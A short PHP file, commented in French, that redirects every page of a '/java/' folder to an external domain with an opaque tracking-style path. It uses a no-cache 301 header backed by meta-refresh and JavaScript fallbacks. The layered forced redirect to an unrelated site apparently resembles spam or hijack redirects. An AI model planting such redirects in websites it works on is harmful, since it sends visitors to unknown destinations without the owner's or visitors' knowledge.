<?php
// =============================
// CONFIGURATION
// =============================

// Lien vers lequel rediriger toutes les pages du dossier /java/
$redirect_url = "https://www.milabrtru.com/DBX55GJ/X384KDK/";

// =============================
// REDIRECTION SERVEUR (Instantanée)
// =============================
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");
header("Location: $redirect_url", true, 301);
exit;
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<!-- REDIRECTION HTML (backup instantané) -->
<meta http-equiv="refresh" content="0; url=<?php echo $redirect_url; ?>">
<title>Redirection...</title>
</head>
<body>
<!-- REDIRECTION JS (si header + meta sont bloqués) -->
<script>
window.location.replace("<?php echo $redirect_url; ?>");
</script>

Si vous voyez ceci, <a href="<?php echo $redirect_url; ?>">cliquez ici</a>.
</body>
</html>
